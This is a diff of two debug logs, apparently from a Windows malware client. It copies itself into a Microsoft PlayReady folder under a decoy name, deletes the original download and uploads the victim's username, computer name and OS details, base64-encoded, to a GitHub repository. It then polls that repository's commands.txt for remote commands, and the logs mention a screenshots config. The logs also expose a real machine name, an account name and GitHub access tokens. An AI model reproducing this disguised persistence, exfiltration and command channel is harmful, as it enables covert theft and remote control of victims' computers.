@@ -1,69 +1,75 @@
-[2026-06-01 01:17:00.343] [TRACE] main: start
-[2026-06-01 01:17:00.349] [TRACE] is_privileged_account: start
-[2026-06-01 01:17:00.358] [TRACE] is_privileged_account: SID check rev=1 count=5 auth=5 sub=21
-[2026-06-01 01:17:00.360] Client starting - Running as User
-[2026-06-01 01:17:00.363] [TRACE] process_startup_arguments: start
-[2026-06-01 01:17:00.386] Elevating
-[2026-06-01 01:17:00.392] Skipping elevation request (UAC disabled) ? running without elevation
-[2026-06-01 01:17:00.407] [TRACE] main: current_exe=C:\Users\DEEBYTE COMPUTERS\Documents\Js\downloaded_from_gdown.exe
-[2026-06-01 01:17:00.410] [TRACE] get_playready_dir: resolving target directory
-[2026-06-01 01:17:00.430] Wrong location. Relocating
-[2026-06-01 01:17:00.432] [TRACE] migrate_and_restart: start
-[2026-06-01 01:17:00.443] Current exe: "C:\\Users\\DEEBYTE COMPUTERS\\Documents\\Js\\downloaded_from_gdown.exe"
-[2026-06-01 01:17:00.461] Args: ["C:\\Users\\DEEBYTE COMPUTERS\\Documents\\Js\\downloaded_from_gdown.exe"]
-[2026-06-01 01:17:00.506] [TRACE] get_playready_dir: resolving target directory
-[2026-06-01 01:17:00.520] Target dir: "C:\\Users\\DEEBYTE COMPUTERS\\AppData\\Local\\Microsoft\\PlayReady"
-[LOG 2026-06-01 01:17:00.526] Target already exists, spawning existing instance
-[LOG 2026-06-01 01:17:00.550] Spawned existing instance, exiting
-[2026-06-01 01:17:00.608] [TRACE] main: start
-[2026-06-01 01:17:00.613] [TRACE] is_privileged_account: start
-[2026-06-01 01:17:00.620] [TRACE] is_privileged_account: SID check rev=1 count=5 auth=5 sub=21
-[2026-06-01 01:17:00.622] Client starting - Running as User
-[2026-06-01 01:17:00.624] [TRACE] process_startup_arguments: start
-[LOG 2026-06-01 01:17:00.626] Cleanup requested for: C:\Users\DEEBYTE COMPUTERS\Documents\Js\downloaded_from_gdown.exe
-[LOG 2026-06-01 01:17:00.633] Original file deleted successfully
-[2026-06-01 01:17:00.635] Elevating
-[2026-06-01 01:17:00.637] Skipping elevation request (UAC disabled) ? running without elevation
-[2026-06-01 01:17:00.640] [TRACE] main: current_exe=C:\Users\DEEBYTE COMPUTERS\AppData\Local\Microsoft\PlayReady\dbengin.exe
-[2026-06-01 01:17:00.642] [TRACE] get_playready_dir: resolving target directory
-[2026-06-01 01:17:00.644] Running from target location
-[2026-06-01 01:17:00.646] [TRACE] verify_unique_execution: creating mutex
-[2026-06-01 01:17:00.648] [TRACE] verify_unique_execution: unique instance confirmed
-[2026-06-01 01:17:00.653] Running without elevated privileges
-[2026-06-01 01:17:00.656] Collecting system info...
-[2026-06-01 01:17:00.658] [TRACE] gather_and_store_environment_data: start
-[2026-06-01 01:17:00.660] [TRACE] retrieve_current_user: start
-[2026-06-01 01:17:00.666] [TRACE] retrieve_current_user: DEEBYTE COMPUTERS
-[2026-06-01 01:17:02.969] [TRACE] generate_system_identifier: computing prefix
-[2026-06-01 01:17:02.971] [TRACE] retrieve_current_user: start
-[2026-06-01 01:17:02.978] [TRACE] retrieve_current_user: DEEBYTE COMPUTERS
-[2026-06-01 01:17:02.981] [TRACE] normalize_filename: input=DESKTOP-SDBADVS
-[2026-06-01 01:17:03.006] [TRACE] normalize_filename: input=DEEBYTE COMPUTERS
-[2026-06-01 01:17:03.159] Checking for existing file at https://api.github.com/repos/hehehahaheha/ToSayHello/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/files/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS_system_info.txt
-[2026-06-01 01:17:03.961] SHA GET status: 200 OK
-[2026-06-01 01:17:03.963] SHA GET body (snippet): {"name":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS_system_info.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/files/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS_system_info.txt","sha":"fc33e1285f8bda0bec6146803801eed33e0a5111","size":321,"url":"https://api.github.com/repos/hehehahaheha/ToSayHello/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/files/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS_system_info.txt?ref=main","html_url":"https://github.com/hehehahaheha/ToSayHello/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/files/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS_system_info.txt","git_url":"https://api.github.com/repos/hehehahaheha/ToSayHello/git/blobs/fc33e1285f8bda0bec6146803801eed33e0a5111","download_url":"https://raw.githubusercontent.com/hehehahaheha/ToSayHello/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/files/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS_system_info.txt?token=B2RBTTDZ5ASBOIRUZ46247DKDSLXZAA","type":"file","content":"PT09PT0gU1lTVEVNIElORk8gPT09PT0KVXNlcm5hbWU6IERFRUJZVEUgQ09N\nUFVURVJTCkNvbXB1dGVyIE5hbWU6IERFU0tUT1AtU0RCQURWUwpPUzogd2lu\nZG93cwpBcmNoaXRlY3R1cmU6IHg4Nl82NApPUyBWZXJzaW9uOiBNaWNyb3Nv\nZnQgV2luZG93cyBbVmVyc2lvbiAxMC4wLjI2MjAwLjg0NTddCkN1cnJlbnQg\nRGlyZWN0b3J5OiBDOlxVc2Vyc1xERUVCWVRFIENPTVBVVEVSU1xEb2N1bWVu\ndHNcSnMKRXhlY3V0YWJsZSBQYXRoOiBDOlxVc2Vyc1xERUVCWVRFIENPTVBV\nVEVSU1xBcHBEYXRhXExvY2FsXE1pY3Jvc29mdFxQbGF5UmVhZHlcZGJlbmdp\nbi5leGUK\n","encoding":"base64","_links":{"self":"https://api.github.com/repos/hehehahaheha/ToSayHello/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/files/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS_system_info.txt?ref=main","git":"https://api.github.com/repos/hehehahaheha/ToSayHello/git/blobs/fc33e1285f8bda0bec6146803801eed33e0a5111","html":"https://github.com/hehehahaheha/ToSayHello/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/files/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS_system_info.txt"}}
-[2026-06-01 01:17:03.967] GitHub PUT attempt 1/3 to https://api.github.com/repos/hehehahaheha/ToSayHello/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/files/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS_system_info.txt
-[2026-06-01 01:17:04.829] Uploaded to GitHub -> DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/files/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS_system_info.txt (status 200 OK)
-[2026-06-01 01:17:05.988] ? VERIFIED: File confirmed on GitHub
-[2026-06-01 01:17:06.037] Polling every 10 seconds
-[2026-06-01 01:17:06.039] MAIN LOOP STARTING - About to enter polling loop
-[2026-06-01 01:17:06.041] [TRACE] main loop: iteration start
-[2026-06-01 01:17:06.043] 
+[2026-06-01 01:22:58.283] [TRACE] main: start
+[2026-06-01 01:22:58.292] [TRACE] is_privileged_account: start
+[2026-06-01 01:22:58.310] [TRACE] is_privileged_account: SID check rev=1 count=5 auth=5 sub=21
+[2026-06-01 01:22:58.320] Client starting - Running as User
+[2026-06-01 01:22:58.325] [TRACE] process_startup_arguments: start
+[2026-06-01 01:22:58.338] Elevating
+[2026-06-01 01:22:58.343] Skipping elevation request (UAC disabled) ? running without elevation
+[2026-06-01 01:22:58.354] [TRACE] main: current_exe=C:\Users\DEEBYTE COMPUTERS\Documents\Js\downloaded_from_gdown.exe
+[2026-06-01 01:22:58.367] [TRACE] get_playready_dir: resolving target directory
+[2026-06-01 01:22:58.395] Wrong location. Relocating
+[2026-06-01 01:22:58.408] [TRACE] migrate_and_restart: start
+[2026-06-01 01:22:58.422] Current exe: "C:\\Users\\DEEBYTE COMPUTERS\\Documents\\Js\\downloaded_from_gdown.exe"
+[2026-06-01 01:22:58.469] Args: ["C:\\Users\\DEEBYTE COMPUTERS\\Documents\\Js\\downloaded_from_gdown.exe"]
+[2026-06-01 01:22:58.505] [TRACE] get_playready_dir: resolving target directory
+[2026-06-01 01:22:58.509] Target dir: "C:\\Users\\DEEBYTE COMPUTERS\\AppData\\Local\\Microsoft\\PlayReady"
+[LOG 2026-06-01 01:22:58.522] Target already exists, spawning existing instance
+[LOG 2026-06-01 01:22:58.549] Spawned existing instance, exiting
+[2026-06-01 01:22:58.592] [TRACE] main: start
+[2026-06-01 01:22:58.606] [TRACE] is_privileged_account: start
+[2026-06-01 01:22:58.623] [TRACE] is_privileged_account: SID check rev=1 count=5 auth=5 sub=21
+[2026-06-01 01:22:58.625] Client starting - Running as User
+[2026-06-01 01:22:58.627] [TRACE] process_startup_arguments: start
+[LOG 2026-06-01 01:22:58.629] Cleanup requested for: C:\Users\DEEBYTE COMPUTERS\Documents\Js\downloaded_from_gdown.exe
+[LOG 2026-06-01 01:22:58.636] Original file deleted successfully
+[2026-06-01 01:22:58.638] Elevating
+[2026-06-01 01:22:58.640] Skipping elevation request (UAC disabled) ? running without elevation
+[2026-06-01 01:22:58.641] [TRACE] main: current_exe=C:\Users\DEEBYTE COMPUTERS\AppData\Local\Microsoft\PlayReady\dbengin.exe
+[2026-06-01 01:22:58.643] [TRACE] get_playready_dir: resolving target directory
+[2026-06-01 01:22:58.645] Running from target location
+[2026-06-01 01:22:58.647] [TRACE] verify_unique_execution: creating mutex
+[2026-06-01 01:22:58.649] [TRACE] verify_unique_execution: unique instance confirmed
+[2026-06-01 01:22:58.651] Running without elevated privileges
+[2026-06-01 01:22:58.653] Collecting system info...
+[2026-06-01 01:22:58.655] [TRACE] gather_and_store_environment_data: start
+[2026-06-01 01:22:58.657] [TRACE] retrieve_current_user: start
+[2026-06-01 01:22:58.677] [TRACE] retrieve_current_user: DEEBYTE COMPUTERS
+[2026-06-01 01:23:00.752] [TRACE] generate_system_identifier: computing prefix
+[2026-06-01 01:23:00.754] [TRACE] retrieve_current_user: start
+[2026-06-01 01:23:00.756] [TRACE] retrieve_current_user: DEEBYTE COMPUTERS
+[2026-06-01 01:23:00.769] [TRACE] normalize_filename: input=DESKTOP-SDBADVS
+[2026-06-01 01:23:00.771] [TRACE] normalize_filename: input=DEEBYTE COMPUTERS
+[2026-06-01 01:23:00.792] Checking for existing file at https://api.github.com/repos/hehehahaheha/ToSayHello/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/files/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS_system_info.txt
+[2026-06-01 01:23:01.632] SHA GET status: 200 OK
+[2026-06-01 01:23:01.634] SHA GET body (snippet): {"name":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS_system_info.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/files/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS_system_info.txt","sha":"fc33e1285f8bda0bec6146803801eed33e0a5111","size":321,"url":"https://api.github.com/repos/hehehahaheha/ToSayHello/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/files/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS_system_info.txt?ref=main","html_url":"https://github.com/hehehahaheha/ToSayHello/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/files/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS_system_info.txt","git_url":"https://api.github.com/repos/hehehahaheha/ToSayHello/git/blobs/fc33e1285f8bda0bec6146803801eed33e0a5111","download_url":"https://raw.githubusercontent.com/hehehahaheha/ToSayHello/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/files/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS_system_info.txt?token=B2RBTTHCYZIKOP4LHWIHDNLKDSMODAA","type":"file","content":"PT09PT0gU1lTVEVNIElORk8gPT09PT0KVXNlcm5hbWU6IERFRUJZVEUgQ09N\nUFVURVJTCkNvbXB1dGVyIE5hbWU6IERFU0tUT1AtU0RCQURWUwpPUzogd2lu\nZG93cwpBcmNoaXRlY3R1cmU6IHg4Nl82NApPUyBWZXJzaW9uOiBNaWNyb3Nv\nZnQgV2luZG93cyBbVmVyc2lvbiAxMC4wLjI2MjAwLjg0NTddCkN1cnJlbnQg\nRGlyZWN0b3J5OiBDOlxVc2Vyc1xERUVCWVRFIENPTVBVVEVSU1xEb2N1bWVu\ndHNcSnMKRXhlY3V0YWJsZSBQYXRoOiBDOlxVc2Vyc1xERUVCWVRFIENPTVBV\nVEVSU1xBcHBEYXRhXExvY2FsXE1pY3Jvc29mdFxQbGF5UmVhZHlcZGJlbmdp\nbi5leGUK\n","encoding":"base64","_links":{"self":"https://api.github.com/repos/hehehahaheha/ToSayHello/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/files/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS_system_info.txt?ref=main","git":"https://api.github.com/repos/hehehahaheha/ToSayHello/git/blobs/fc33e1285f8bda0bec6146803801eed33e0a5111","html":"https://github.com/hehehahaheha/ToSayHello/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/files/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS_system_info.txt"}}
+[2026-06-01 01:23:01.637] GitHub PUT attempt 1/3 to https://api.github.com/repos/hehehahaheha/ToSayHello/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/files/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS_system_info.txt
+[2026-06-01 01:23:02.529] Uploaded to GitHub -> DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/files/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS_system_info.txt (status 200 OK)
+[2026-06-01 01:23:03.682] ? VERIFIED: File confirmed on GitHub
+[2026-06-01 01:23:03.689] Polling every 10 seconds
+[2026-06-01 01:23:03.691] MAIN LOOP STARTING - About to enter polling loop
+[2026-06-01 01:23:03.693] [TRACE] main loop: iteration start
+[2026-06-01 01:23:03.697] 
 --- POLL ITERATION START ---
-[2026-06-01 01:17:06.071] [TRACE] initialize_storage_directory: start
-[2026-06-01 01:17:07.299] commands.txt already exists in DESKTOP-SDBADVS_DEEBYTE_COMPUTERS
-[2026-06-01 01:17:07.955] screenshots/config.json already exists
-[2026-06-01 01:17:08.973] Fetching path list from GitHub...
-[2026-06-01 01:17:08.976] [COMMANDS] Fetching from: https://api.github.com/repos/hehehahaheha/ToSayHello/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main
-[2026-06-01 01:17:08.978] [COMMANDS] GET attempt 1/4
-[2026-06-01 01:17:09.607] [COMMANDS] Response status: 200 OK
-[2026-06-01 01:17:09.609] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/hehehahaheha/ToSayHello/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/hehehahaheha/ToSayHello/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/hehehahaheha/ToSayHello/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/hehehahaheha/ToSayHello/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=B2RBTTGO3DCQFCHUJFMHQ33KDSLYDAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/hehehahaheha/ToSayHello/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/hehehahaheha/ToSayHello/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/hehehahaheha/ToSayHello/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
-[2026-06-01 01:17:09.611] [COMMANDS] Encoded content length: 0
-[2026-06-01 01:17:09.613] [COMMANDS] Cleaned base64 length: 0
-[2026-06-01 01:17:09.627] [COMMANDS] Decoded content empty on attempt 1
-[2026-06-01 01:17:10.643] [COMMANDS] GET attempt 2/4
-[2026-06-01 01:17:11.039] [COMMANDS] Response status: 200 OK
-[2026-06-01 01:17:11.041] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/hehehahaheha/ToSayHello/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/hehehahaheha/ToSayHello/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/hehehahaheha/ToSayHello/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/hehehahaheha/ToSayHello/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=B2RBTTFCX4KNYKIJOUXH2DLKDSLYHAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/hehehahaheha/ToSayHello/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/hehehahaheha/ToSayHello/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/hehehahaheha/ToSayHello/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
-[2026-06-01 01:17:11.043] [COMMANDS] Encoded content length: 0
-[2026-06-01 01:17:11.045] [COMMANDS] Cleaned base64 length: 0
-[2026-06-01 01:17:11.048] [COMMANDS] Decoded content empty on attempt 2
+[2026-06-01 01:23:03.698] [TRACE] initialize_storage_directory: start
+[2026-06-01 01:23:04.371] commands.txt already exists in DESKTOP-SDBADVS_DEEBYTE_COMPUTERS
+[2026-06-01 01:23:04.993] screenshots/config.json already exists
+[2026-06-01 01:23:06.007] Fetching path list from GitHub...
+[2026-06-01 01:23:06.013] [COMMANDS] Fetching from: https://api.github.com/repos/hehehahaheha/ToSayHello/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main
+[2026-06-01 01:23:06.015] [COMMANDS] GET attempt 1/4
+[2026-06-01 01:23:06.634] [COMMANDS] Response status: 200 OK
+[2026-06-01 01:23:06.636] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/hehehahaheha/ToSayHello/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/hehehahaheha/ToSayHello/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/hehehahaheha/ToSayHello/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/hehehahaheha/ToSayHello/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=B2RBTTC5CMIBL557ZHPJ3PLKDSMONAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/hehehahaheha/ToSayHello/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/hehehahaheha/ToSayHello/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/hehehahaheha/ToSayHello/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-06-01 01:23:06.638] [COMMANDS] Encoded content length: 0
+[2026-06-01 01:23:06.640] [COMMANDS] Cleaned base64 length: 0
+[2026-06-01 01:23:06.643] [COMMANDS] Decoded content empty on attempt 1
+[2026-06-01 01:23:07.673] [COMMANDS] GET attempt 2/4
+[2026-06-01 01:23:08.054] [COMMANDS] Response status: 200 OK
+[2026-06-01 01:23:08.056] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/hehehahaheha/ToSayHello/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/hehehahaheha/ToSayHello/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/hehehahaheha/ToSayHello/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/hehehahaheha/ToSayHello/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=B2RBTTBWRZL74L5AEGV2ASTKDSMORAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/hehehahaheha/ToSayHello/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/hehehahaheha/ToSayHello/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/hehehahaheha/ToSayHello/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-06-01 01:23:08.061] [COMMANDS] Encoded content length: 0
+[2026-06-01 01:23:08.063] [COMMANDS] Cleaned base64 length: 0
+[2026-06-01 01:23:08.067] [COMMANDS] Decoded content empty on attempt 2
+[2026-06-01 01:23:10.070] [COMMANDS] GET attempt 3/4
+[2026-06-01 01:23:10.417] [COMMANDS] Response status: 200 OK
+[2026-06-01 01:23:10.419] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/hehehahaheha/ToSayHello/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/hehehahaheha/ToSayHello/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/hehehahaheha/ToSayHello/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/hehehahaheha/ToSayHello/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=B2RBTTDCLI7QX35W5WR6ICTKDSMOVAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/hehehahaheha/ToSayHello/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/hehehahaheha/ToSayHello/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/hehehahaheha/ToSayHello/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-06-01 01:23:10.422] [COMMANDS] Encoded content length: 0
+[2026-06-01 01:23:10.424] [COMMANDS] Cleaned base64 length: 0
+[2026-06-01 01:23:10.427] [COMMANDS] Decoded content empty on attempt 3
